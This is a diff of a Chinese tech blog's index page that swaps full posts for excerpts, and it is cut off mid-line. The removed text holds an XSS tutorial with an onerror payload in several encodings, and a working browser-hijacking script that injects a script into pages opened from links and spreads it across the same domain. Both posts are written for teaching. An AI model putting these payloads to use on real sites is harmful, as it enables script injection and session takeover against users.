@@ -303,47 +303,10 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><strong>关于这个自解码机制，我们直接以一个例子（样例0）来进行说明：</strong></p>
+              <p><strong>关于这个自解码机制，我们直接以一个例子（样例0）来进行说明：</strong></p>
 <figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"button"</span> id=<span class="string">"exec_btn"</span> <span class="built_in">value</span>=<span class="string">"exec"</span> onclick=<span class="string">"document.write ('&lt;img src=@ onerror=alert(123) /&gt;')"</span> /&gt;</div></pre></td></tr></table></figure>
-<p>我们假设<code>document.write</code>里的值是用户可控的输入，点击后，<code>document.write</code>出现一段 <code>img HTML</code>，<code>onerror</code>里的 JavaScript 会执行。此时陷阱来了，我们现在提供一段<code>HtmlEncode</code>函数如下（样例A）：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">HtmlEncode</span><span class="params">(str)</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> s = <span class="string">""</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (str.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line"></div><div class="line">    s = str.replace(/&amp;/g, <span class="string">"&amp;"</span>);</div><div class="line"></div><div class="line">    s = s.replace(/&lt;/g, <span class="string">"&lt;"</span>);</div><div class="line"></div><div class="line">    s = s.replace(/&gt;/g, <span class="string">"&gt;"</span>);</div><div class="line"></div><div class="line">    s = s.replace(/\<span class="string">"/g, "</span><span class="string">""</span>);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> s;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"exec_btn"</span> <span class="attr">value</span>=<span class="string">"exec"</span> <span class="attr">onclick</span>=<span class="string">"document.write (HtmlEncode('&lt;img src=@ onerror=alert(123) /&gt;'))"</span> /&gt;</span></div></pre></td></tr></table></figure>
-<p>我们知道<code>HtmlEncode(&#39;&lt;img src=@ onerror=alert(123) /&gt;&#39;)</code>后的结果是：</p>
-<blockquote>
-<p><code>&lt;img src=@ onerror=alert(123) /&gt;</code></p>
-</blockquote>
-<p>这个样例 A 点击后会执行 <code>alert(123)</code> 吗？下面这个呢（样例 B）？<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"button"</span> id=<span class="string">"exec_btn"</span> <span class="built_in">value</span>=<span class="string">"exec"</span> onclick=<span class="string">"document.write ('&lt;img src=@ onerror=alert(123) /&gt;')"</span> /&gt;</div></pre></td></tr></table></figure></p>
-<p>在样例 A 和样例 B 中，<code>document.write</code> 的值似乎是一样的？实际结果是样例 A 点击不会执行 <code>alert(123)</code>，而是在页面上完整地输出<code>&lt;img src=@ onerror=alert(123) /&gt;</code>，而样例 B 点击后会执行<code>alert(123)</code>。</p>
-<p>我们要告诉大家的是，点击样例B时，<code>document.write</code>的值实际上不再是：<code>&lt;img src=@ onerror=alert(123) /&gt;</code></p>
-<p>而是：<br><code>&lt;img src=@ onerror=alert(123) /&gt;</code></p>
-<p>我们可以这样论证：<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"button"</span> id=<span class="string">"exec_btn"</span> <span class="built_in">value</span>=<span class="string">"exec"</span> onclick=<span class="string">"x='&lt;img src=@ onerror=alert(123) /&gt;';alert(x);document.write(x)"</span> /&gt;</div></pre></td></tr></table></figure></p>
-<p> 看弹出的x值就知道了，如下图所示。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2836722-718069165ffc9375.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="proof"></p>
-<hr>
-<p>出现这个结果的原因如下：</p>
-<p><code>onclick</code>里的这段 JavaScript 出现在 HTML 标签内，意味着这里的JavaScript 可以进行 HTML 形式的编码，这种编码有以下两种。</p>
-<blockquote>
-<ol>
-<li>进制编码：<strong><code>&amp;#xH;</code></strong>（十六进制格式）、<strong><code>&amp;#D;</code></strong>（十进制格式），最后的分号<strong>（;）</strong>可以不要。</li>
-<li>HTML 实体编码：即上面的那个 <code>HtmlEncode</code>。</li>
-</ol>
-</blockquote>
-<p> 在 JavaScript 执行之前，HTML 形式的编码会自动解码。所以样例 0 与样例 B 的意义是一样的，而样例 A 就不一样了。下面我们继续完善这些例子。</p>
-<p> 上面的用户输入是出现在 HTML 里的情况，如果用户输入出现在<code>&lt;script&gt;</code>里的 JavaScript 中，情况会怎样，代码如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"exec_btn"</span> <span class="attr">value</span>=<span class="string">"exec"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params">id</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">document</span>.getElementById(id);&#125;;</div><div class="line">$(<span class="string">'exec_btn'</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">      <span class="built_in">document</span>.write(<span class="string">"&lt;img src=@ onerror=alert(123) /&gt;"</span>);</div><div class="line">      <span class="comment">//document.write("&lt;img src=@ onerror=alert(123) /&gt;");</span></div><div class="line">&#125;;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p> 这样是可以执行<code>alert(123)</code>的，如果用户输入的是下面的内容：<br><code>&lt;img src=@ onerror=alert(123) /&gt;</code></p>
-<p> 结果与样例 B 一样：这段 HTML 编码的内容在 JavaScript 执行之前自动解码吗？答案是不会，原因是用户输入的这段内容上下文环境是 JavaScript，不是HTML（可以认为<code>&lt;script&gt;</code>标签里的内容和 HTML 环境毫无关系），此时用户输入的这段内容要遵守的是 JavaScript 法则，即 JavaScript 编码，具体有如下几种形式。</p>
-<blockquote>
-<ol>
-<li><strong>Unicode</strong> 形式：<strong>\uH</strong> (十六进制)。</li>
-<li>普通十六进制：<strong>\xH</strong>。</li>
-<li>纯转义：<strong> \’ </strong>、<strong> \” </strong>、<strong> \&lt; </strong>、<strong> > </strong>这样在特殊字符之前加 <strong> \ </strong> 进行转义。</li>
-</ol>
-</blockquote>
-<p>比如，用户输入被转义成如下形式：<br><code>\&lt;img src\=@ onerror=alert\(123\) \/\&gt;</code></p>
-<p>在 JavaScript 执行之前，这样的转义会自动去转义，<code>alert(123)</code> 照样执行。同样，下面这样的 JavaScript 编码也毫无意义：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;img src=@ onerror=alert(123) /&gt;</div><div class="line">--&gt;</div><div class="line"><span class="symbol">\u</span>003c<span class="symbol">\u</span>0069<span class="symbol">\u</span>006d<span class="symbol">\u</span>0067<span class="symbol">\u</span>0020<span class="symbol">\u</span>0073<span class="symbol">\u</span>0072<span class="symbol">\u</span>0063<span class="symbol">\u</span>003d<span class="symbol">\u</span>0040<span class="symbol">\u</span>0020<span class="symbol">\u</span>006f<span class="symbol">\u</span>006e<span class="symbol">\u</span>0065<span class="symbol">\u</span>0072<span class="symbol">\u</span>0072<span class="symbol">\u</span>006f<span class="symbol">\u</span>0072<span class="symbol">\u</span>003d<span class="symbol">\u</span>0061<span class="symbol">\u</span>006c<span class="symbol">\u</span>0065<span class="symbol">\u</span>0072<span class="symbol">\u</span>0074<span class="symbol">\u</span>0028<span class="symbol">\u</span>0031<span class="symbol">\u</span>0032<span class="symbol">\u</span>0033<span class="symbol">\u</span>0029<span class="symbol">\u</span>0020<span class="symbol">\u</span>002f<span class="symbol">\u</span>003e</div><div class="line"></div><div class="line"><span class="symbol">\x</span>3c<span class="symbol">\x</span>69<span class="symbol">\x</span>6d<span class="symbol">\x</span>67<span class="symbol">\x</span>20<span class="symbol">\x</span>73<span class="symbol">\x</span>72<span class="symbol">\x</span>63<span class="symbol">\x</span>3d<span class="symbol">\x</span>40<span class="symbol">\x</span>20<span class="symbol">\x</span>6f<span class="symbol">\x</span>6e<span class="symbol">\x</span>65<span class="symbol">\x</span>72<span class="symbol">\x</span>72<span class="symbol">\x</span>6f<span class="symbol">\x</span>72<span class="symbol">\x</span>3d<span class="symbol">\x</span>61<span class="symbol">\x</span>6c<span class="symbol">\x</span>65<span class="symbol">\x</span>72<span class="symbol">\x</span>74<span class="symbol">\x</span>28<span class="symbol">\x</span>31<span class="symbol">\x</span>32<span class="symbol">\x</span>33<span class="symbol">\x</span>29<span class="symbol">\x</span>20<span class="symbol">\x</span>2f<span class="symbol">\x</span>3e</div></pre></td></tr></table></figure></p>
-<p> 在 JavaScript 执行之前，这样的编码会自动解码。</p>
-<p>通过这几个样例，我们可以知道在 HTML 中与在 JavaScript 中自动解码的差异。</p>
-<p><code>参考《Web 前端黑客技术揭秘》</code></p>
-
+<p>我们假设<code>document.write</code>里的值是用户可控的输入，点击后，<code>document.write</code>出现一段 <code>img HTML</code>，<code>onerror</code>里的 JavaScript 会执行。此时陷阱来了，我们现在提供一段<code>HtmlEncode</code>函数如下（样例A）：<br>+
+          
       
     </div>
     
@@ -352,6 +315,10 @@
       
 
       
+      
+        <p class="article-more-link">
+          <a href="/2016/04/20/HTML-与-javascript-自解码机制/#more">阅读全文 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -398,34 +365,11 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>###1.前言</p>
+              <p>###1.前言</p>
 <hr>
 <p>相信大家都遇到过这样的情况：<br>当你在家正兴致勃勃的网上冲浪的时候，忽然之间，所有网页都打不开了，所有联网的软件都无法联网了，用测速软件测网速，网速却显示正常，但就是无法浏览网页或者打开网页奇慢。</p>
-<p>这是什么原因呢？<br>很不幸的告诉你，这是因为你的 <strong> DNS 被劫持</strong> 了</p>
-<p>2014年1月21日下午15点中国境内发生 <a href="http://baike.baidu.com/link?url=JMIPZm9IlyXZYN-GgP0-mOQJhhvXBlQiJpvk1zoNJMp-mdBX0Uo9qX_o3CU_zKGHXOp1ZwoTd4SsQ8BOsYYapK" target="_blank" rel="external">DNS</a> 解析服务故障（主要原因是DNS污染或 <a href="http://baike.baidu.com/link?url=_VNMHkdfTl9-0UBn9ZaiUQ8HZ3Zgy1xLZpM_ErHp_2SnXQsXal7oDG5WzaVliCE-9BLbfrg2bF2QcnFvKBGdVwEBpP0UyPPVLA2ufPwX1PG" target="_blank" rel="external">DNS劫持</a>），导致 <a href="http://jump.bdimg.com/safecheck/index?url=rN3wPs8te/pL4AOY0zAwhz3wi8AXlR5gsMEbyYdIw62ZqSRI+pbFtjMMI7SVblqUt6XyibVFgk4fbLMgytUg5Z4Q4OO30Ri8SAtVjSx1NjJY8K44RtEayHkEjFA1gT0IGWo+JEf+quX2hcwa59MkVoP/IraPdCIG9OPQxLQzCVTyOcmsecMbZ+LYjXh9d1tH39xJFcihqGh2Pah4egTNMg==" target="_blank" rel="external">百度</a> 等多家网站长达几个小时之内无法访问。其指向的 <a href="http://baike.baidu.com/link?url=OdSxQ9_x7QrS2pr78iFYOU1DdW05-bso8ZVEaqr8I8svGNXAlHqHEQqkrTEOUI-GfbAjIubw4NyPzPyaWLT0wKRidcIC5hl1TshyiNWp-Ou" target="_blank" rel="external">IP地址</a> 为65.49.2.178，所以该IP又被冠名为65.49.2.178事件。</p>
-<p>2014年1月21日下午三点十分左右，全国 <a href="http://baike.baidu.com/link?url=Dr7ThKyfgUXOyWw06wTsBUHTFU0iW9eZNNGdEpHvvNfC1Xaf08rrMRpZBOoYWp_VkSL_f9EJqL0sWMnpXTgVe_" target="_blank" rel="external">DNS</a> 域名解析系统出现了大范围的访问故障，包括 <a href="http://baike.baidu.com/link?url=m2IrLy5z3l0rSBF9d-WI3NITs6y6_IDBpsyi7XSxG_VUwBN54fzegGdMHFo1UMY2COrWjahrvmPluux9-m8LLK" target="_blank" rel="external">DNSPod</a> 在内的多家域名解析服务提供商予以确认，此次事故波及全国，有近三分之二的网站不同程度的出现了不同地区、不同网络环境下的访问故障，其中<a href="http://jump.bdimg.com/safecheck/index?url=rN3wPs8te/pL4AOY0zAwhz3wi8AXlR5gsMEbyYdIw62ZqSRI+pbFtjMMI7SVblqUt6XyibVFgk4fbLMgytUg5Z4Q4OO30Ri8SAtVjSx1NjJY8K44RtEayHkEjFA1gT0IGWo+JEf+quX2hcwa59MkVoP/IraPdCIG9OPQxLQzCVTyOcmsecMbZ+LYjXh9d1tH39xJFcihqGh2Pah4egTNMg==" target="_blank" rel="external">百度</a>、<a href="http://jump.bdimg.com/safecheck/index?url=rN3wPs8te/pL4AOY0zAwhz3wi8AXlR5gsMEbyYdIw63h9fafqvRfHo1UDeOlFObFt6XyibVFgk4fbLMgytUg5Z4Q4OO30Ri8SAtVjSx1NjJY8K44RtEayHkEjFA1gT0IGWo+JEf+quX2hcwa59MkVoP/IraPdCIG9OPQxLQzCVTyOcmsecMbZ+LYjXh9d1tH39xJFcihqGh2Pah4egTNMg==" target="_blank" rel="external">新浪</a> 等知名网站也受到了影响。</p>
-<p>###2.什么是dns劫持？</p>
-<hr>
-<blockquote>
-<p><strong>DNS劫持</strong> 又称域名劫持,是指通过某些手段取得某域名的解析控制权，修改此域名的解析结果，导致对该域名的访问由原IP地址转入到修改后的指定IP，其结果就是对特定的网址不能访问或访问的是假网址。<br>如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS劫持的基本原理。DNS劫持其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。</p>
-</blockquote>
-<p>好了扯了这么多，进入正题，我今天要分享的是与之相关的另外一种劫持技术——浏览器劫持技术</p>
-<p>###3.浏览器劫持</p>
-<hr>
-<p><strong>浏览器劫持技术是指通过劫持用户点击链接操作，在打开新窗口的时候注入攻击者的 JavaScript 脚本，以达到将 <a href="http://baike.baidu.com/link?url=5iAnpimA68xgDPevb_LV27wK2quRS--TmsqHX5Y_XuVdVKyQv9L9lRMjYjoViDY4UX5kHhW1oe2xatY4r3SC8_" target="_blank" rel="external">XSS</a>（跨站脚本攻击）威胁延续到同域内的其他页面的目的。</strong></p>
-<p><strong>Example：</strong></p>
-<p>HTML文件<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">		<span class="comment">&lt;!-- 劫持链接对象 --&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"test_映纷创意.html"</span>&gt;</span>映纷创意<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"test_映纷创意_joinus.html"</span>&gt;</span>映纷创意_joinus<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">			<span class="function"><span class="keyword">function</span> <span class="title">scriptobj</span>(<span class="params">window_obj, src</span>)</span>&#123;</div><div class="line">				s = window_obj.document.createElement(<span class="string">'script'</span>);</div><div class="line">				s.src = src;</div><div class="line">				window_obj.document.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>].appendChild(s);</div><div class="line">			&#125;</div><div class="line">			<span class="function"><span class="keyword">function</span> <span class="title">hijack_links</span>(<span class="params">js</span>)</span>&#123;</div><div class="line">				<span class="comment">/*劫持链接点击,参数说明:</span></div><div class="line">					js:注入打开的同域链接页面的目标 js 文件*/</div><div class="line">				<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">document</span>.links.length; i++)&#123;</div><div class="line">					<span class="comment">//遍历链接对象，劫持 onclick 事件</span></div><div class="line">					<span class="built_in">document</span>.links[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">						x = <span class="built_in">window</span>.open(<span class="keyword">this</span>.href); <span class="comment">//获取打开新窗口的对象</span></div><div class="line">						setTimeout(<span class="string">"scriptobj(x,'"</span>+js+<span class="string">"')"</span>,<span class="number">1000</span>);</div><div class="line">						<span class="comment">//延时 2 秒向打开的劫持链接对象的 DOM 树种注入 alert.js 文件</span></div><div class="line">						<span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">					&#125;;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			hijack_links(<span class="string">'js/alert.js'</span>);</div><div class="line">		<span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p>js 文件（alert.js）<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">alert(<span class="string">"哈哈，你被劫持了！"</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
-<hr>
-<p>通过测试，我们发现从当前网页打开的所有链接都被劫持了（这里为了测试，使用弹出框来代表被注入的脚本文件）</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2836722-d3a6abc0866c5248.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="原网页"></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2836722-808711a132c91f4d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="新打开的窗口1"></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2836722-486a07c45cdc9d94.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="新打开的窗口2"></p>
-<p><strong>为了让这样的劫持继续下去，可以在 alert.js 中继续执行 hijack_links ，以达到在同域内对任意页面进行控制的目的。</strong></p>
-<p>修改后的 js 文件如下（alert.js）：<br>（这里依然使用弹出框来代表新打开窗口已被注入脚本文件）<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">alert(<span class="string">"哈哈，你被劫持了！"</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">scriptobj</span>(<span class="params">window_obj, src</span>) </span>&#123;</div><div class="line">	s = window_obj.document.createElement(<span class="string">'script'</span>);</div><div class="line">	s.src = src;</div><div class="line">	window_obj.document.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>].appendChild(s);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">hijack_links</span>(<span class="params">js</span>) </span>&#123;</div><div class="line">	<span class="comment">/*劫持链接点击,参数说明:</span></div><div class="line">		js:注入打开的同域链接页面的目标 js 文件*/</div><div class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">document</span>.links.length; i++) &#123;</div><div class="line">		<span class="comment">//遍历链接对象，劫持 onclick 事件</span></div><div class="line">		<span class="built_in">document</span>.links[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">			x = <span class="built_in">window</span>.open(<span class="keyword">this</span>.href); <span class="comment">//获取打开新窗口的对象</span></div><div class="line">			setTimeout(<span class="string">"scriptobj(x,'"</span> + js + <span class="string">"')"</span>, <span class="number">1000</span>);</div><div class="line">			<span class="comment">//延时 2 秒向打开的劫持链接对象的 DOM 树种注入 alert.js 文件</span></div><div class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">		&#125;;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">hijack_links(<span class="string">'js/alert.js'</span>);</div></pre></td></tr></table></figure></p>
-<p><strong>这时，你会发现同域内的所有你打开的网页都被劫持了，即使你从新打开的网页中点击任何链接打开其他窗口依然在被劫持的域名内，无论你打开多少网页，都会被攻击者注入脚本。</strong></p>
-<p><code>参考《Web 前端黑客技术揭秘》</code></p>
-
+<p>这是什么原因呢？<br>很不幸的告诉你，这是因为你的 <strong> DNS 被劫持</strong> 了<br>+
+          
       
     </div>
     
@@ -434,6 +378,10 @@
       
 
       
+      
+        <p class="article-more-link">
+          <a href="/2016/03/28/Web-前端-黑客技术——-浏览器劫持技术/#more">阅读全文 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -480,41 +428,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>今天在用面向对象进行编程的过程中，遇到了一个隐藏得很深的坑，在此与大家分享一下，避免以后再犯，也给大家提供一个参考。</p>
-<hr>
-<p>先看一下问题代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="css"></span></div><div class="line">			<span class="selector-id">#contents</span>&#123;</div><div class="line">				<span class="attribute">position</span>: relative;</div><div class="line">			&#125;</div><div class="line">			<span class="selector-id">#contents</span> <span class="selector-tag">div</span>&#123;</div><div class="line">				<span class="attribute">width</span>: <span class="number">200px</span>;</div><div class="line">				<span class="attribute">height</span>: <span class="number">200px</span>;</div><div class="line">				<span class="attribute">border</span>: <span class="number">1px</span> dashed red;</div><div class="line">				<span class="attribute">position</span>: absolute;</div><div class="line">				<span class="attribute">display</span>: none;</div><div class="line">			&#125;</div><div class="line">		<span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"titles"</span>&gt;</span></div><div class="line">	</div><div class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"contents"</span>&gt;</span></div><div class="line">			</div><div class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">		</div><div class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">			<span class="function"><span class="keyword">function</span> <span class="title">SelectCard</span>(<span class="params">btn, div</span>)</span>&#123;</div><div class="line">				<span class="keyword">this</span>.btn = btn;</div><div class="line">				<span class="keyword">this</span>.div = div;</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">			SelectCard.prototype.init = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">				<span class="keyword">this</span>.btn.onmouseover = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">					<span class="keyword">this</span>.div.style.display = <span class="string">"block"</span>;</div><div class="line">				&#125;.bind(<span class="keyword">this</span>);</div><div class="line">				<span class="keyword">this</span>.btn.onmouseout = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">					<span class="keyword">this</span>.div.style.display = <span class="string">"none"</span>;</div><div class="line">				&#125;.bind(<span class="keyword">this</span>);</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">			SelectCard.handleJson = <span class="function"><span class="keyword">function</span>(<span class="params">resultText</span>)</span>&#123;</div><div class="line"></div><div class="line">				<span class="keyword">var</span> objs = <span class="built_in">JSON</span>.parse(resultText);</div><div class="line">				<span class="keyword">var</span> data = objs.data;</div><div class="line">				<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = data.length; i &lt; len; i++)&#123;</div><div class="line">					<span class="keyword">var</span> btns = <span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</div><div class="line">					<span class="keyword">var</span> divs = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</div><div class="line">					btns.innerHTML = data[i].title;</div><div class="line">					divs.innerHTML = data[i].content;</div><div class="line">					titles.appendChild(btns);</div><div class="line">					contents.appendChild(divs);</div><div class="line">					<span class="keyword">var</span> xxk = <span class="keyword">new</span> SelectCard(btns, divs);</div><div class="line">					xxk.init();</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">			(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;				</div><div class="line">				<span class="keyword">var</span> xhr = <span class="built_in">window</span>.XMLHttpRequest ? <span class="keyword">new</span> XMLHttpRequest() : <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</div><div class="line">				xhr.open(<span class="string">"GET"</span>, <span class="string">"data.json"</span>, <span class="literal">true</span>);</div><div class="line">				xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">					<span class="keyword">if</span>(xhr.readyState == <span class="number">4</span>)&#123;</div><div class="line">						<span class="keyword">if</span>(xhr.status == <span class="number">200</span>)&#123;</div><div class="line">							SelectCard.handleJson(xhr.responseText);</div><div class="line">						&#125;</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				xhr.send(<span 